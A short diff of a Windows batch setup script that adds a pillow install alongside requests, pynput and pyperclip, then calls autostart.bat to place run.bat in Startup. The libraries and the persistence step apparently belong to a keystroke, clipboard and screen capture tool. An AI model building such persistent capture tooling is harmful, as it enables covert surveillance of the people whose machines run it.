@@ -14,6 +14,7 @@ if %errorlevel% equ 0 (
 pip install requests
 pip install pynput
 pip install pyperclip
+pip install pillow
 
 :: Run autostart.bat to add run.bat to Startup
 call autostart.bat
